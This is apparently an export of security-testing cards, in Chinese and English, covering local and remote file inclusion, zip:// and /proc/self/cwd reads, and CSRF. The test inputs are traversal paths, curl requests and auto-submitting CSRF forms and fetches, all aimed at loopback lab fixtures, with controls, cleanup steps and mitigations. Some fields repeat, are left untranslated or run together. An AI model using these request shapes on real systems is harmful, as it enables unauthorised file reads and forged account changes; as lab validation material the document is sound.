description.zh: 定位参数进入 readfile、file_get_contents、include 或等价 API 的位置，并记录正常资源 ID。
description.en: Locate where the parameter reaches readfile, file_get_contents, include, or an equivalent API and record a normal resource ID.

title.zh: 准备只读 Marker

description.zh: 在批准工作目录创建随机文本 marker，设置只读权限并记录规范路径。
description.en: Create a random text marker in the approved working directory, set read-only permissions, and record its canonical path.

title.zh: 提交唯一读取输入

description.zh: 发送本卡唯一请求，保存原始参数、解码值、响应和最终路径或 wrapper 记录。
description.en: Send the card's only request and preserve the raw parameter, decoded value, response, and final path or wrapper record.

attackChain.payload:
BASE="http://127.0.0.1:8080"
curl --fail --silent --show-error --max-time 3 "$BASE/include?file=../payloader-fixture/PAYLOADER_MARKER.txt"

title.zh: 关联精确证据

description.zh: 响应精确返回工作目录 marker，且最终路径日志显示请求解析到该只读夹具，并用缺失 marker 与正常路径对照排除默认文件、缓存和其他任务。
description.en: the response returns the exact working-directory marker and final-path logs show resolution to that read-only fixture, with missing-marker and normal-path controls excluding default files, cache, and unrelated jobs.

title.zh: 修复并回归

description.zh: 改为固定资源映射后重放异常与正常输入，确认越界读取失败且合法资源仍可访问。
description.en: After adopting fixed resource mappings, replay variant and normal inputs to confirm the out-of-bound read fails while legitimate resources remain available.

overview.zh: 本地 Marker 文件读取边界把原混合集合缩减为一个无副作用的读取边界。路径字典、编码、归档或 Session 夹具制作均迁入工具卡，Payload 不承担执行和持久化操作。
overview.en: Local Marker File Read Boundary reduces the mixed source to one side-effect-free read boundary. Path dictionaries, encoding, archive, or session fixture creation move to tools; the payload performs no execution or persistence.

vulnerability.zh: 根因是相对路径是否在一次解码与规范化后离开批准读取根目录。应用若在最终解码、规范化或 wrapper 选择前做安全判断，就可能让用户输入跨越预期资源映射。
vulnerability.en: The root cause is whether a relative path leaves the approved read root after one decoding and canonicalization pass. A security decision made before final decoding, canonicalization, or wrapper selection can let user input cross the intended resource mapping.

exploitation.zh: 先读取批准根内 marker 建立基线，再提交本卡唯一请求。阳性证据必须是响应精确返回工作目录 marker，且最终路径日志显示请求解析到该只读夹具；缺失 marker 对照应失败，警告、500 和响应时延不构成确认。
exploitation.en: Read an in-root marker as a baseline, then submit the card's single request. Positive evidence requires that the response returns the exact working-directory marker and final-path logs show resolution to that read-only fixture; a missing-marker control must fail, and warnings, HTTP 500, or latency do not confirm the issue.

mitigation.zh: 使用固定资源 ID 到文件或模板的服务端映射，拒绝用户 scheme 与路径；必须读取文件时，只解码一次，在最终规范路径上验证根目录，并以低权限只读方式打开。
mitigation.en: 使用固定资源 ID 到文件或模板的服务端映射，拒绝用户 scheme 与路径；必须读取文件时，只解码一次，在最终规范路径上验证根目录，并以低权限只读方式打开。

name.zh: RFI 回环 HTTP Marker 包含边界
name.en: RFI Loopback HTTP Marker Inclusion Boundary

description.zh: 使用只返回纯文本 marker 的回环 HTTP 服务验证远程资源是否进入服务端 include/template Sink，不提供任何脚本内容。
description.en: Uses a loopback HTTP service returning plain-text markers only to test whether a remote resource reaches a server include or template sink without serving script content.

prerequisites.zh: 目标服务端语言和配置允许远程 URL 进入 include/require 类 Sink；仅 URL 出现在响应、客户端请求或普通 HTTP fetch 不构成 RFI。
prerequisites.en: The server language and configuration permit a remote URL to reach an include or require-style sink; a URL in a response, a client request, or an ordinary HTTP fetch does not constitute RFI.

prerequisites.zh: 准备只绑定 127.0.0.1 的短文本 marker 服务、单次请求、应用访问日志和模板/包含调用栈，不提供脚本代码。
prerequisites.en: Prepare a short-text marker service bound only to 127.0.0.1, one request, application access logs, and template or include call-stack evidence without serving script code.

title.zh: 回环 HTTP Marker URL

description.zh: 在已启动的回环 marker 服务上只请求该短文本资源，并把服务端首包与应用 include 调用栈关联。
description.en: Request only this short text resource from the loopback marker service and correlate the first packet with the application's include call stack.

analysis.zh: 阳性要求应用进程获取该 token 且 include/template Sink 消费响应；普通 HTTP 客户端请求、URL 回显或连接错误不算。
analysis.en: A positive requires the application process to fetch this token and the include or template sink to consume the response; an ordinary HTTP client request, URL reflection, or connection error does not count.

opsecTips.zh: 只提供短纯文本 marker，出现脚本解释、子进程、外连、真实文件访问或 worker 异常时停止。
opsecTips.en: Serve short plain-text markers only and stop on script interpretation, child processes, egress, real-file access, or worker anomalies.

opsecTips.zh: 测试后停止回环服务、删除临时目录和日志，清空模板/URL 缓存并回归正常本地模板。
opsecTips.en: Stop the loopback service, delete temporary directories and logs, clear template and URL caches, and regress normal local templates afterward.

title.zh: 确认 RFI Sink

description.zh: 记录运行时远程包含配置、Sink 和纯文本负对照。
description.en: Record runtime remote-inclusion settings, the sink, and a plain-text negative control.

title.zh: 提交单一回环 URL

description.zh: 只提交本执行区 URL 并触发一次处理。
description.en: Submit only this execution URL and trigger one processing run.

attackChain.payload: ?file=http://127.0.0.1:18080/PAYLOADER_MARKER.txt

title.zh: 关联请求与包含证据

description.zh: 绑定 marker 首包、请求 ID、调用栈和渲染输出。
description.en: Bind the marker first packet, request ID, call stack, and render output.

title.zh: 关闭远程资源并回归

description.zh: 修复后本地模板保持可用，远程 URL 在访问前被拒绝。
description.en: After remediation local templates remain functional and the remote URL is rejected before access.

overview.zh: RFI 的关键不是应用能请求 URL，而是远程响应进入服务端包含语义。安全验证只提供纯文本 marker，并分别证明网络获取、include Sink 和服务端解释阶段。
overview.en: RFI 的关键不是应用能请求 URL，而是远程响应进入服务端包含语义。安全验证只提供纯文本 marker，并分别证明网络获取、include Sink 和服务端解释阶段。

vulnerability.zh: 应用把用户控制的 URL 直接交给 include/require 或等价模板加载器，且运行时允许远程资源。远程内容因此跨越数据边界进入服务端解析上下文。
vulnerability.en: The application sends a user-controlled URL directly to include, require, or an equivalent template loader while the runtime permits remote resources, allowing remote content to cross into a server parsing context.

exploitation.zh: 先用不可解释的纯文本建立负对照，再提交单一回环 marker URL，关联 marker 服务首包、应用请求 ID、include 调用栈和渲染结果。大小写变体必须逐条测试，不能把 DNS、连接错误或普通代理请求当作包含。
exploitation.en: Establish a negative control with non-executable plain text, submit one loopback marker URL, and correlate the marker server's first packet, application request ID, include call stack, and render result. Test scheme-case variants individually and do not treat DNS, connection errors, or an ordinary proxy request as inclusion.

mitigation.zh: 禁止用户输入参与模板或文件路径，关闭不需要的远程包含能力，使用固定资源映射和 allowlist，并对 URL 规范化后再次授权。运行身份应限制网络和文件权限。
mitigation.en: Keep user input out of template and file paths, disable unnecessary remote-inclusion capability, use fixed resource mappings and allowlists, and reauthorize after URL normalization. Restrict network and filesystem permissions for the runtime identity.

name.zh: RFI HTTP Scheme 大小写规范化边界

description.zh: 逐条比较混合大小写与大写 HTTP scheme 在校验器、URL parser 和远程包含 Sink 中是否被一致规范化。
description.en: 逐条比较混合大小写与大写 HTTP scheme 在校验器、URL parser 和远程包含 Sink 中是否被一致规范化。

prerequisites.zh: 目标服务端语言和配置允许远程 URL 进入 include/require 类 Sink；仅 URL 出现在响应、客户端请求或普通 HTTP fetch 不构成 RFI。
prerequisites.en: The server language and configuration permit a remote URL to reach an include or require-style sink; a URL in a response, a client request, or an ordinary HTTP fetch does not constitute RFI.

prerequisites.en: Prepare a short-text marker service bound only to 127.0.0.1, one request, application access logs, and template or include call-stack evidence without serving script code.

title.zh: HTTP Scheme 大小写对照

description.zh: 每次只提交一行并记录校验值、parser 规范化结果和 marker 首包，避免把两次请求混为一个证据。
description.en: Submit one line per run and record the validated value, parser normalization result, and marker first packet without combining two requests into one finding.

analysis.zh: 大小写 scheme 只有在校验层拒绝而 include 层规范化并访问同一 marker 时才证明差异；两个层都接受或都拒绝不是绕过。
analysis.en: A scheme-case difference is proven only when validation rejects while the include layer normalizes and fetches the same marker; both layers accepting or rejecting is not a bypass.

opsecTips.zh: 只提供短纯文本 marker，出现脚本解释、子进程、外连、真实文件访问或 worker 异常时停止。
opsecTips.en: Serve short plain-text markers only and stop on script interpretation, child processes, egress, real-file access, or worker anomalies.

opsecTips.zh: 测试后停止回环服务、删除临时目录和日志，清空模板/URL 缓存并回归正常本地模板。
opsecTips.en: Stop the loopback service, delete temporary directories and logs, clear template and URL caches, and regress normal local templates afterward.

title.zh: 记录规范化基线

description.zh: 记录小写 HTTP 在各层的规范化与远程包含结果。
description.en: Record lower-case HTTP normalization and remote-inclusion results across layers.

title.zh: 逐条提交大小写变体
title.en: Submit case variants one by one

description.zh: 每轮只选择本执行区的一行。
description.en: Select only one line from this execution entry per run.

attackChain.payload:

description.zh: 关联边界校验、URL parser、首包和 include 日志。
description.en: Correlate edge validation, URL parser output, first packets, and include logs.

title.zh: 统一规范化并回归

description.zh: 修复后所有 scheme 先规范化再授权，远程 URL 一致拒绝。
description.en: After remediation every scheme is normalized before authorization and remote URLs are rejected consistently.

name.zh: 日志 Marker 文件读取边界

description.zh: 日志 Marker 文件读取边界验证受控请求写入的纯文本 marker 是否能经文件包含入口被读取，而不执行日志内容。它只保留一个 include/read 输入，并以 PAYLOADER_MARKER、请求 ID 和最终解析记录作为证据。
description.en: Log Marker File Read Boundary validates whether a plain-text marker written by a controlled request can be read through the inclusion entry without executing log content. It retains one include or read input and uses PAYLOADER_MARKER, request ID, and final resolution records as evidence.

subCategory.zh: 日志 Marker 文件读取边界

prerequisites.zh: 工作目录中存在随机只读 PAYLOADER_MARKER 夹具，并记录其规范路径与清理责任。
prerequisites.en: A random read-only PAYLOADER_MARKER fixture exists in the working directory with its canonical path and cleanup owner recorded.

prerequisites.zh: 本地服务只监听 127.0.0.1，并可查看 URL 解码、最终路径、stream wrapper 和 include 结果日志。
prerequisites.en: The local service listens only on 127.0.0.1 and exposes URL-decoding, final-path, stream-wrapper, and include-result logs.

title.zh: 日志 Marker 文件读取边界验证请求
title.en: Log Marker File Read Boundary Validation Request

description.zh: 该请求只读取工作目录 PAYLOADER_MARKER，并要求结合最终路径或 wrapper 日志判断。
description.en: This request reads only the working-directory PAYLOADER_MARKER and must be evaluated with final-path or wrapper logs.

analysis.zh: 确认标准是同一请求 ID 的 User-Agent marker 出现在受控日志并由读取入口原样返回，PHP 代码从未提交或执行。单独的 HTTP 200、PHP warning、空响应、WAF 告警或一次超时都不足以证明文件包含。
analysis.en: Confirmation requires that the User-Agent marker for the same request ID appears in the controlled log and is returned verbatim, with no PHP code submitted or executed. HTTP 200 alone, a PHP warning, an empty response, a WAF alert, or a single timeout does not prove file inclusion.

opsecTips.zh: 只使用工作目录 marker、localhost 与一次性请求 ID，禁止真实系统、凭据、环境和其他进程路径。
opsecTips.en: Use only working-directory markers, localhost, and one-time request IDs; prohibit real system, credential, environment, and other-process paths.

opsecTips.zh: 不提交可执行 PHP、WebShell、反向通道或序列化对象；每个请求设置三秒超时并在结束后清理夹具。
opsecTips.en: Do not submit executable PHP, web shells, reverse channels, or serialized objects; cap each request at three seconds and clean fixtures afterward.

title.zh: 确认读取 API

description.en: Locate where the parameter reaches readfile, file_get_contents, include, or an equivalent API and record a normal resource ID.

title.zh: 准备只读 Marker

description.zh: 在批准工作目录创建随机文本 marker，设置只读权限并记录规范路径。

title.zh: 提交唯一读取输入

description.zh: 发送本卡唯一请求，保存原始参数、解码值、响应和最终路径或 wrapper 记录。
description.en: Send the card's only request and preserve the raw parameter, decoded value, response, and final path or wrapper record.

attackChain.payload: ?file=../payloader-fixture/PAYLOADER_MARKER.txt

title.zh: 关联精确证据

description.zh: 异常路径读取相邻 marker，正常根内基线成功、缺失 marker 对照失败，最终规范路径完整记录，并用缺失 marker 与正常路径对照排除默认文件、缓存和其他任务。
description.en: the variant reads the adjacent marker, the normal in-root baseline succeeds, the missing-marker control fails, and the final canonical path is recorded, with missing-marker and normal-path controls excluding default files, cache, and unrelated jobs.

title.zh: 修复并回归

description.zh: 改为固定资源映射后重放异常与正常输入，确认越界读取失败且合法资源仍可访问。
description.en: After adopting fixed resource mappings, replay variant and normal inputs to confirm the out-of-bound read fails while legitimate resources remain available.

overview.zh: LFI 路径遍历 Marker 读取边界把原混合集合缩减为一个无副作用的读取边界。路径字典、编码、归档或 Session 夹具制作均迁入工具卡，Payload 不承担执行和持久化操作。
overview.en: LFI Path-Traversal Marker Read Boundary reduces the mixed source to one side-effect-free read boundary. Path dictionaries, encoding, archive, or session fixture creation move to tools; the payload performs no execution or persistence.

vulnerability.zh: 根因是相对段经过 URL 解码与路径规范化后是否越过批准根目录并读取相邻 marker 夹具。应用若在最终解码、规范化或 wrapper 选择前做安全判断，就可能让用户输入跨越预期资源映射。
vulnerability.en: The root cause is whether relative segments cross the approved root after URL decoding and canonicalization and read an adjacent marker fixture. exploitation.en: Read an in-root marker as a baseline, then submit the card's single request. Positive evidence requires that the variant reads the adjacent marker, the normal in-root baseline succeeds, the missing-marker control fails, and the final canonical path is recorded; a missing-marker control must fail, and warnings, HTTP 500, or latency do not confirm the issue.

mitigation.zh: 使用固定资源 ID 到文件或模板的服务端映射，拒绝用户 scheme 与路径；必须读取文件时，只解码一次，在最终规范路径上验证根目录，并以低权限只读方式打开。
mitigation.en: 使用固定资源 ID 到文件或模板的服务端映射，拒绝用户 scheme 与路径；必须读取文件时，只解码一次，在最终规范路径上验证根目录，并以低权限只读方式打开。

name.zh: zip:// 归档成员读取边界

description.en: zip:// Archive Member Read Boundary validates whether zip://archive.zip#member reads only one marker member from a controlled ZIP archive. It retains one include or read input and uses PAYLOADER_MARKER, request ID, and final resolution records as evidence.

subCategory.zh: zip:// 归档成员读取边界

prerequisites.zh: 工作目录中存在随机只读 PAYLOADER_MARKER 夹具，并记录其规范路径与清理责任。
prerequisites.en: A random read-only PAYLOADER_MARKER fixture exists in the working directory with its canonical path and cleanup owner recorded.

prerequisites.zh: 本地服务只监听 127.0.0.1，并可查看 URL 解码、最终路径、stream wrapper 和 include 结果日志。
prerequisites.en: The local service listens only on 127.0.0.1 and exposes URL-decoding, final-path, stream-wrapper, and include-result logs.

title.zh: zip:// 归档成员读取边界验证请求
title.en: zip:// Archive Member Read Boundary Validation Request

description.zh: 该请求只读取工作目录 PAYLOADER_MARKER，并要求结合最终路径或 wrapper 日志判断。
description.en: This request reads only the working-directory PAYLOADER_MARKER and must be evaluated with final-path or wrapper logs.

analysis.zh: 确认标准是归档清单只含 marker.txt，读取结果精确匹配 PAYLOADER_MARKER，最终成员路径与任务 ID 一致。单独的 HTTP 200、PHP warning、空响应、WAF 告警或一次超时都不足以证明文件包含。
analysis.en: Confirmation requires that the archive inventory contains only marker.txt, the read result exactly matches PAYLOADER_MARKER, and the final member path agrees with the job ID. HTTP 200 alone, a PHP warning, an empty response, a WAF alert, or a single timeout does not prove file inclusion.

opsecTips.zh: 只使用工作目录 marker、localhost 与一次性请求 ID，禁止真实系统、凭据、环境和其他进程路径。
opsecTips.en: Use only working-directory markers, localhost, and one-time request IDs; prohibit real system, credential, environment, and other-process paths.

opsecTips.zh: 不提交可执行 PHP、WebShell、反向通道或序列化对象；每个请求设置三秒超时并在结束后清理夹具。
opsecTips.en: Do not submit executable PHP, web shells, reverse channels, or serialized objects; cap each request at three seconds and clean fixtures afterward.

title.zh: 确认读取 API

description.zh: 定位参数进入 readfile、file_get_contents、include 或等价 API 的位置，并记录正常资源 ID。

title.zh: 准备只读 Marker

description.zh: 在批准工作目录创建随机文本 marker，设置只读权限并记录规范路径。

title.zh: 提交唯一读取输入

description.zh: 发送本卡唯一请求，保存原始参数、解码值、响应和最终路径或 wrapper 记录。
description.en: Send the card's only request and preserve the raw parameter, decoded value, response, and final path or wrapper record.

description.en: Send the card's only request and preserve the raw parameter, decoded value, response, and final path or wrapper record.

attackChain.payload:
BASE="http://127.0.0.1:8080"
curl --fail --silent --show-error --max-time 3 "$BASE/include?file=/proc/self/cwd/payloader-fixture/PAYLOADER_MARKER.txt"

title.zh: 关联精确证据

description.zh: 最终路径解析到工作目录 marker，响应精确匹配且审计中没有 environ、cmdline 或 fd 枚举，并用缺失 marker 与正常路径对照排除默认文件、缓存和其他任务。
description.en: the final path resolves to the working-directory marker, the response matches exactly, and audit logs show no environ, cmdline, or fd enumeration, with missing-marker and normal-path controls excluding default files, cache, and unrelated jobs.

title.zh: 修复并回归

description.zh: 改为固定资源映射后重放异常与正常输入，确认越界读取失败且合法资源仍可访问。
description.en: After adopting fixed resource mappings, replay variant and normal inputs to confirm the out-of-bound read fails while legitimate resources remain available.

overview.zh: /proc/self/cwd Marker 读取边界把原混合集合缩减为一个无副作用的读取边界。路径字典、编码、归档或 Session 夹具制作均迁入工具卡，Payload 不承担执行和持久化操作。
overview.en: /proc/self/cwd Marker Read Boundary reduces the mixed source to one side-effect-free read boundary. Path dictionaries, encoding, archive, or session fixture creation move to tools; the payload performs no execution or persistence.

vulnerability.zh: 根因是/proc/self/cwd 符号链接是否让读取入口解析到当前工作目录中的批准 marker，而不触碰环境或其他进程。应用若在最终解码、规范化或 wrapper 选择前做安全判断，就可能让用户输入跨越预期资源映射。
vulnerability.en: The root cause is whether the /proc/self/cwd symlink lets the read entry resolve to an approved marker in the current working directory without touching environments or other processes. A security decision made before final decoding, canonicalization, or wrapper selection can let user input cross the intended resource mapping.

exploitation.zh: 先读取批准根内 marker 建立基线，再提交本卡唯一请求。阳性证据必须是最终路径解析到工作目录 marker，响应精确匹配且审计中没有 environ、cmdline 或 fd 枚举；缺失 marker 对照应失败，警告、500 和响应时延不构成确认。
exploitation.en: Read an in-root marker as a baseline, then submit the card's single request. Positive evidence requires that the final path resolves to the working-directory marker, the response matches exactly, and audit logs show no environ, cmdline, or fd enumeration; a missing-marker control must fail, and warnings, HTTP 500, or latency do not confirm the issue.

mitigation.zh: 使用固定资源 ID 到文件或模板的服务端映射，拒绝用户 scheme 与路径；必须读取文件时，只解码一次，在最终规范路径上验证根目录，并以低权限只读方式打开。
mitigation.en: 使用固定资源 ID 到文件或模板的服务端映射，拒绝用户 scheme 与路径；必须读取文件时，只解码一次，在最终规范路径上验证根目录，并以低权限只读方式打开。

name.zh: CSRF 请求形状基础验证

description.zh: 使用本地表单、GET 子资源、text/plain Fetch 和顶级导航 marker，验证浏览器是否自动携带会话并到达状态变更处理器。
description.en: Use local form, GET subresource, text/plain Fetch, and top-level navigation markers to validate whether browsers carry ambient sessions to state-changing handlers.

prerequisites.zh: 使用 127.0.0.1 CSRF Fixture 和只允许修改合成 email marker 的测试账号。
prerequisites.en: Use the 127.0.0.1 CSRF fixture and a test identity that may change only a synthetic email marker.

prerequisites.zh: 记录 Cookie SameSite、Origin、Referer、Sec-Fetch-Site、Token 判定和服务端 request_id。
prerequisites.en: Record cookie SameSite, Origin, Referer, Sec-Fetch-Site, token decision, and server request_id.

title.zh: 1. 构造CSRF表单

execution.command:
<!doctype html>
<meta charset="utf-8">
<form action="http://127.0.0.1:18080/lab/csrf/profile-email" method="post">
  <input type="hidden" name="email" value="csrf-a1@lab.invalid">
  <input type="hidden" name="marker" value="CSRF_FORM_A1">
  <button type="submit">Submit local CSRF marker</button>
</form>
<script>document.forms[0].requestSubmit();</script>

description.zh: 构造自动提交的CSRF表单
description.en: Construct auto-submitting CSRF form

title.zh: 2. GET请求CSRF

description.zh: GET请求的CSRF攻击
description.en: GETRequest CSRFAttack

title.zh: 3. JSON CSRF

execution.command:
<script>
fetch("http://127.0.0.1:18080/lab/csrf/json-compatible", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: JSON.stringify({marker: "CSRF_TEXT_C3"})
}).then(response => document.body.dataset.status = String(response.status));
</script>

description.zh: JSON格式的CSRF攻击
description.en: JSON-formatted CSRF attack.

title.zh: 4. 链接诱导

description.zh: 诱导用户点击
description.en: Entice user to click

analysis.zh: 阳性必须把跨站浏览器请求、环境凭据、服务端处理日志和合成状态变化关联到同一 request_id。请求到达但无凭据、Token 拒绝、状态未变或只返回错误页面都属于有效阻断。
analysis.en: A positive must correlate the cross-site browser request, ambient credentials, server processing logs, and synthetic state change under one request_id. Delivery without credentials, token rejection, unchanged state, or an error page is effective blocking evidence.

opsecTips.zh: 只修改可回滚的合成 email marker，禁止触发真实账号、支付、权限或删除操作。
opsecTips.en: Change only a reversible synthetic email marker and never trigger real account, payment, privilege, or deletion actions.

opsecTips.zh: 每个用例使用独立浏览器上下文，完成后清理 Cookie、marker 和服务端实验日志。
opsecTips.en: Use a separate browser context for each case and clear cookies, markers, and fixture logs afterward.

title.zh: Referer绕过

wafBypass.command:
<!doctype html>
<meta name="referrer" content="no-referrer">
<form action="http://127.0.0.1:18080/lab/csrf/referer-control" method="post">
  <input type="hidden" name="marker" value="CSRF_NOREF_E5">
  <button type="submit">Submit no-referrer control</button>
</form>

description.zh: 绕过Referer检查
description.en: Bypass Referer Check

title.zh: Token绕过

wafBypass.command:
<!doctype html>
<form action="http://127.0.0.1:18080/lab/csrf/token-control" method="post">
  <input type="hidden" name="marker" value="CSRF_TOKEN_F6">
  <button type="submit">Submit missing-token control</button>
</form>

description.zh: 绕过Token验证
description.en: Bypass Token Verify

syntaxBreakdown.part:
检查Token是否可预测
2. 检查Token是否绑定会话
3. 检查Token是否在GET参数中泄露
4. 检查是否有Token重放漏洞

title.zh: 建立同源状态基线

description.zh: 用测试账号执行正常请求并记录 Cookie、来源 Header、Token 和合成状态。
description.en: Use the test identity for a normal request and record cookies, source headers, token, and synthetic state.

title.zh: 提交跨站表单 Marker

description.zh: 从独立本地 Origin 自动提交 Form，只改变合成 email 与唯一 marker。
description.en: Auto-submit a form from a separate local origin, changing only the synthetic email and unique marker.

attackChain.payload:
<!doctype html>
<meta charset="utf-8">
<form action="http://127.0.0.1:18080/lab/csrf/profile-email" method="post">
  <input type="hidden" name="email" value="csrf-a1@lab.invalid">
  <input type="hidden" name="marker" value="CSRF_FORM_A1">
  <button type="submit">Submit local CSRF marker</button>
</form>
<script>document.forms[0].requestSubmit();</script>

title.zh: 比较其他请求形状

description.zh: 分别测试 GET 子资源、text/plain Fetch 和顶级导航，记录凭据是否附带。
description.en: Test GET subresource, text/plain Fetch, and top-level navigation separately and record credential inclusion.

title.zh: 验证状态与修复回归

description.zh: 确认只有服务端状态变化才算阳性，修复后要求全部跨站 marker 被拒绝。
description.en: 确认只有服务端状态变化才算阳性，修复后要求全部跨站 marker 被拒绝。

overview.zh: CSRF 利用浏览器自动附带的环境凭据，让跨站页面发起应用接受的状态变更请求。验证时应按 HTML Form、GET 子资源、简单 text/plain 请求和顶级导航拆分请求形状，并明确哪些 Header 或 Cookie 实际出现，而不是假设所有 Fetch 都能绕过预检。
overview.en: CSRF abuses ambient browser credentials so a cross-site page can send a state-changing request accepted by the application. Validation should separate HTML forms, GET subresources, simple text/plain requests, and top-level navigation while recording actual headers and cookies instead of assuming every Fetch bypasses preflight.

vulnerability.zh: 成立条件包括状态变更端点依赖 Cookie 或其他环境凭据、请求能由跨站页面生成、服务端没有有效 Token 或来源校验，并且测试操作实际改变合成状态。仅能发送请求、返回 2xx、缺少 Token 字段或页面可被访问都不足以确认 CSRF。
vulnerability.en: Required conditions are a state-changing endpoint that relies on cookies or other ambient credentials, a request shape that a cross-site page can generate, missing effective token or source validation, and a demonstrated synthetic state change. Request delivery, HTTP 2xx, a missing token field, or endpoint reachability alone is insufficient.

exploitation.zh: 先用同源请求建立正常基线，再从独立本地 Origin 逐个运行 Form、GET、text/plain 和导航 marker。每次使用唯一 request_id，比较浏览器网络面板与服务端日志，并查询合成状态是否变化。Referer 与 Token 对照单独运行，不执行密码、支付、删除或权限修改。
exploitation.en: Establish a same-origin baseline, then run form, GET, text/plain, and navigation markers one at a time from a separate local origin. Use a unique request_id, compare browser network data with server logs, and query the synthetic state. Run Referer and token controls separately without password, payment, deletion, or privilege changes.

mitigation.zh: 对所有状态变更使用服务端验证并绑定会话的 CSRF Token，优先校验 Origin 并把 Referer 作为补充；Cookie 设置合适的 SameSite、Secure 与 HttpOnly。拒绝 GET 状态变更，结合 Sec-Fetch-Site、重新认证和业务确认形成纵深防御。
mitigation.en: Use server-validated, session-bound CSRF tokens for every state change, validate Origin first with Referer as a fallback, and set suitable SameSite, Secure, and HttpOnly cookie attributes. Reject state changes over GET and add Sec-Fetch-Site checks, reauthentication, and business confirmation as defense in depth.

name.zh: JSON 接口 CSRF 边界验证

description.zh: 验证浏览器能否在携带受害者会话的同时，以简单请求兼容格式触发会改变状态的 JSON 接口；CORS、XSSI、JSONP 与 CSRF 分别记录，不再混为同一机制。
description.en: Validates whether a browser can trigger a state-changing JSON endpoint with the victim session through a simple-request-compatible format. CORS, XSSI, JSONP, and CSRF are evaluated as separate mechanisms.

prerequisites.zh: 使用专用测试账号和可回滚的资料字段，并确认 Cookie 的 SameSite、Secure 和 Domain 属性。
prerequisites.en: Use a dedicated test account and a reversible profile field, and record the cookie SameSite, Secure, and Domain attributes.

prerequisites.zh: 在受控跨站页面与实验接口中使用唯一标记，保留浏览器网络记录、服务端日志和状态变更前后值。
prerequisites.en: Use a unique marker in a controlled cross-site page and lab endpoint, preserving browser network traces, server logs, and before-and-after state.

title.zh: 验证 text/plain 兼容解析

description.zh: 从受控跨站页面向实验资料接口发送唯一标记，检查服务端是否把 text/plain 请求体继续解析为 JSON 并改变状态。
description.en: 从受控跨站页面向实验资料接口发送唯一标记，检查服务端是否把 text/plain 请求体继续解析为 JSON 并改变状态。

title.zh: 验证 HTML 表单写入边界
title.en: Validate the HTML Form Write Boundary

description.zh: 使用标准跨站表单提交可回滚的资料标记，验证接口是否只凭环境 Cookie 接受状态变更。
description.en: Submit a reversible profile marker with a standard cross-site form and verify whether the endpoint accepts a state change based only on ambient cookies.

title.zh: 记录 application/json 预检对照

description.zh: 以相同标记提交 application/json 请求，记录浏览器是否发起 OPTIONS 预检以及服务端是否错误放行，不把预检结果直接等同于 CSRF。
description.en: Submit the same marker as application/json, record whether the browser sends an OPTIONS preflight and whether the server permits it, and do not equate the preflight result with CSRF.

title.zh: 验证 multipart 表单兼容解析

description.zh: 使用浏览器生成的 multipart 请求写入同一可回滚标记，确认后端是否跨内容类型复用不安全的 JSON 绑定逻辑。
description.en: 使用浏览器生成的 multipart 请求写入同一可回滚标记，确认后端是否跨内容类型复用不安全的 JSON 绑定逻辑。

analysis.zh: 有效证据必须证明浏览器携带受害者会话、服务器接受跨站写请求且持久状态发生变化。请求可发送、响应可读取、预检成功、XSSI 或 JSONP 行为都不能替代这三项证据。
analysis.en: Valid evidence must prove that the browser sent the victim session, the server accepted the cross-site write, and persistent state changed. Request delivery, response readability, a successful preflight, XSSI, or JSONP behavior cannot replace those three facts.

opsecTips.zh: 只修改专用测试账号的可回滚字段，并为每次请求使用不同标记。
opsecTips.en: Modify only a reversible field on a dedicated test account and use a distinct marker for every request.

opsecTips.zh: 一旦出现非预期写入、通知或下游任务就停止，并立即恢复原字段值。
opsecTips.en: Stop on any unexpected write, notification, or downstream job, and immediately restore the original field value.

title.zh: 记录 JSON 预检响应

description.zh: 从命令行保存预检响应头作为 CORS 配置证据；该请求不携带浏览器会话，也不能单独确认或排除 CSRF。
description.en: Preserve preflight response headers as CORS configuration evidence; this command-line request has no browser session and cannot confirm or exclude CSRF by itself.

title.zh: 复测服务端来源与令牌校验
title.en: 复测服务端来源与令牌校验

description.zh: 在无登录 Cookie 的对照请求中确认接口拒绝缺少会话绑定令牌或可信来源的写入，再用真实浏览器完成最终回归。
description.en: Use a no-cookie control to confirm that the endpoint rejects writes lacking a session-bound token or trusted origin, then complete the final regression in a real browser.

title.zh: 记录同源正常写入基线

description.zh: 使用专用账号正常修改可回滚字段，保存请求、Cookie 属性、响应、数据库前后值和服务端审计事件。
description.en: Use a dedicated account to change a reversible field normally, preserving the request, cookie attributes, response, before-and-after value, and server audit event.

title.zh: 运行 text/plain 单变量样例

description.zh: 从受控跨站页面只运行第一条样例，并确认浏览器实际发送目标会话以及服务器如何解析请求体。
description.en: Run only the first sample from a controlled cross-site page and confirm whether the browser sends the target session and how the server parses the body.

attackChain.payload: <script>fetch("https://{LAB_APP}/api/profile",{method:"POST",credentials:"include",headers:{"Content-Type":"text/plain"},body:JSON.stringify({displayName:"PAYLOADER-CSRF-MARKER"})});</script>

title.zh: 确认状态变化而非仅有响应
title.en: Confirm a State Change Rather Than a Response

description.zh: 关联资料字段、写入日志和唯一标记；页面加载、网络请求成功或 CORS 响应头都不能单独确认 CSRF。
description.en: Correlate the stored profile field, write log, and unique marker; page load, network success, or CORS response headers alone do not confirm CSRF.

title.zh: 修复并重放四种内容类型
title.en: Remediate and Replay Four Content Types

description.zh: 启用会话绑定令牌、Origin 校验和严格内容类型后，重放四种对照并确认正常同源业务仍可用。
description.en: Enable a session-bound token, Origin validation, and strict content types, then replay all four controls and confirm normal same-origin behavior remains available.

overview.zh: JSON 接口并不会天然免疫 CSRF。真正需要验证的是：浏览器是否能跨站发出服务器会接受的简单请求格式，受害者会话是否随请求发送，以及服务器是否在没有一次性 CSRF 证明时完成了状态变更。application/json 预检、CORS 读权限和 XSSI 数据读取是相邻但不同的问题。
overview.en: JSON endpoints are not inherently immune to CSRF. The relevant question is whether a browser can send a cross-site simple-request-compatible body that the server accepts, whether the victim session accompanies it, and whether state changes without a one-time CSRF proof. An application/json preflight, CORS read access, and XSSI data disclosure are adjacent but distinct issues.

vulnerability.zh: 当接口把 text/plain、表单编码或 multipart 内容继续当作 JSON 解析，同时仅依赖环境 Cookie 认证且不校验 CSRF Token、Origin 或可信 Referer 时，跨站页面可能制造有效写请求。宽松 CORS 不是确认 CSRF 的必要条件，反之允许读取响应也不能单独证明发生了状态变更。
vulnerability.en: The boundary fails when an endpoint parses text/plain, form-encoded, or multipart input as JSON while relying on ambient cookies and omitting a CSRF token plus Origin or trusted Referer validation. Permissive CORS is not required to confirm CSRF, and permission to read a response does not by itself prove a state change.

